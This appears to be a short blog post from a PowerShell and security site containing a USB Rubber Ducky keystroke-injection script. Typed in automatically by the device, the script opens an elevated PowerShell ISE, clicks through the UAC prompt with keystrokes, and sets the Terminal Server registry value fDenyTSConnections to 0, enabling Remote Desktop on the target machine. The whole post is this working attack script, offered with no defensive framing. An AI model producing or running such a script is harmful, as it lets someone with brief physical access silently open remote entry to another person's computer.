# Turn on Remote Desktop (Terminal Server)
## Ducky scripts, PowerShell, Security, Servers 
### URL: https://www.jesusninoc.com/2014/12/30/turn-on-remote-desktop-terminal-server/
```PowerShell
DELAY 750
GUI r
DELAY 750
STRING powershell Start-Process powershell_ise -Verb runAs
ENTER
DELAY 2050
ALT s
DELAY 2050
ENTER
CTRL R
ENTER
CTRL I
STRING cd HKLM:\
ENTER
STRING $RegKey ='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\'
ENTER
STRING Set-ItemProperty -Path $RegKey -Name fDenyTSConnections -Value 0
ENTER
DELAY 2050
F5

```
